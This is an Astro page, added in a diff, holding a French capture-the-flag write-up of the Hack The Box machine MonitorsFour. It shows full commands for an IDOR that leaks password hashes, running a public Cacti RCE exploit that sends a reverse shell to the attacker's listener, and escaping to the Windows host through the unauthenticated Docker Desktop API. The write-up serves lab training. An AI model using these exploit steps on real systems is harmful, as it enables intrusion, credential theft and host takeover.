@@ -1,0 +1,170 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - MonitorsFour">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - MonitorsFour</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-easy">Easy</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Windows (Docker Desktop / WSL2)</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">06 Dec 2025</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-24367</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-9074</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #27ae60; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Medium Windows Docker Desktop + WSL2. IDOR sur l'API web expose les hashes MD5 de tous les utilisateurs, Cacti RCE donne un shell dans un conteneur Linux, puis évasion via l'API Docker Desktop exposée sans authentification pour lire le filesystem Windows.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'IDOR sur /user?token=0', r:'Hashes MD5 de tous les utilisateurs exposés' },
+        { n:'2', v:'CrackStation MD5 → credentials Cacti', r:'Accès panel Cacti' },
+        { n:'3', v:'CVE-2025-24367 — Cacti 1.2.28 RCE', r:'Shell www-data dans conteneur Docker' },
+        { n:'4', v:'CVE-2025-9074 — Docker Desktop API sans auth', r:'Lecture root.txt depuis filesystem Windows' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance</h2>
+    <pre is:raw>echo "10.129.12.34 monitorsfour.htb" | sudo tee -a /etc/hosts
+nmap -sC -sV -p- 10.129.12.34
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Nginx + PHP (cookie PHPSESSID)
+5985/tcp open  WinRM   Microsoft HTTPAPI 2.0
+
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -ac
+# cacti → cacti.monitorsfour.htb
+
+echo "10.129.12.34 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts</pre>
+
+    <h2>2 — IDOR & Credentials Cacti</h2>
+    <p>Le paramètre token de /user est vulnérable à une IDOR classique. La valeur limite token=0 retourne la liste complète des utilisateurs avec leurs hashes MD5.</p>
+    <pre is:raw>curl -s "http://monitorsfour.htb/user?token=0"
+
+# [
+#   {
+#     "id": 2, "username": "admin",
+#     "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
+#     "role": "super user", "name": "Marcus Higgins",
+#     ...
+#   },
+#   { "id": 5, "username": "mwatson", "password": "69196959c16b26ef00b77d82cf6eb169" },
+#   ...
+# ]</pre>
+    <p>Les hashes MD5 sont craqués via CrackStation (rainbow tables).</p>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : admin:[MOT_DE_PASSE] ne fonctionne pas sur Cacti. La réponse JSON contient le nom complet "Marcus Higgins" → tester marcus:[MOT_DE_PASSE] ✓</div>
+
+    <h2>3 — CVE-2025-24367 : Cacti 1.2.28 RCE</h2>
+    <p>CVE-2025-24367 est une injection de commandes dans le champ Graph Template via l'utilitaire rrdtool. Un PoC public est disponible sur GitHub.</p>
+    <pre is:raw>git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
+nc -lvnp 9001
+
+# sudo requis — l'exploit démarre un serveur HTTP sur le port 80
+sudo python3 exploit.py -url http://cacti.monitorsfour.htb \
+     -u marcus -p [MOT_DE_PASSE] -i 10.10.14.36 -l 9001
+
+# [+] Cacti Instance Found!
+# [+] Login Successful!
+# [+] Hit timeout, looks good for shell, check your listener!
+
+# Shell reçu :
+# www-data@821fbd6a43fa:~/html/cacti$
+# Le hostname court = ID de conteneur Docker !
+
+cat /home/marcus/user.txt</pre>
+    <p>Nmap détectait Windows car Docker Desktop utilise WSL2 comme backend — Cacti tourne dans un conteneur Linux mais l'hôte reste Windows.</p>
+
+    <h2>4 — CVE-2025-9074 : Évasion Docker Desktop → root</h2>
+    <p>CVE-2025-9074 (CVSS 9.3) : Docker Desktop expose son API Engine sur le sous-réseau interne SANS authentification, permettant à un conteneur de créer d'autres conteneurs privilégiés et d'accéder au filesystem de l'hôte Windows.</p>
+    <pre is:raw># L'API n'est pas sur la passerelle bridge standard
+ip route  # default via 172.18.0.1
+curl http://172.18.0.1:2375/version  # Connection refused
+
+# Scanner le sous-réseau Docker Desktop (192.168.65.0/24)
+for i in $(seq 1 254); do
+  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
+   | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
+done; wait
+# 192.168.65.7:2375 OPEN</pre>
+    <pre is:raw>curl http://192.168.65.7:2375/version
+# { "Version": "28.3.2", "KernelVersion": "6.6.87.2-microsoft-standard-WSL2" }
+# → API accessible sans authentification !</pre>
+    <pre is:raw># Créer un conteneur montant le lecteur C: Windows
+# Sur Docker Desktop for Windows, /mnt/host/c est le chemin WSL2 du disque C:
+cat > /tmp/container.json << 'EOF'
+{
+  "Image": "alpine:latest",
+  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
+  "HostConfig": { "Binds": ["/mnt/host/c:/mnt/host_root"] },
+  "Tty": true
+}
+EOF
+
+# Servir le fichier et le récupérer depuis le conteneur cible
+python3 -m http.server 8000 &
+curl http://10.10.14.36:8000/container.json -o /tmp/container.json
+
+# Créer et démarrer le conteneur via l'API Docker
+curl -X POST -H "Content-Type: application/json" \
+     -d @/tmp/container.json \
+     http://192.168.65.7:2375/containers/create?name=pwned
+# {"Id":"7d99df11ee0f..."}
+
+curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start
+curl http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true
+# root.txt !</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'IDOR : toujours tester les valeurs limites (0, -1) sur les paramètres d\'API',
+        'Le username retourné par l\'API peut différer du username de l\'application cible',
+        'Cacti/Nagios : historiques CVE chargés, comptes par défaut souvent faibles',
+        'Docker Desktop expose son API Engine sur 192.168.65.0/24 sans auth par défaut',
+        'Ne jamais s\'arrêter au premier shell : analyser le contexte (conteneur vs hôte)',
+        'Nmap détecte l\'OS hôte, pas du conteneur — architecture Docker Desktop/WSL2',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','ffuf','crackstation','CVE-2025-24367-PoC','curl (Docker API)'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
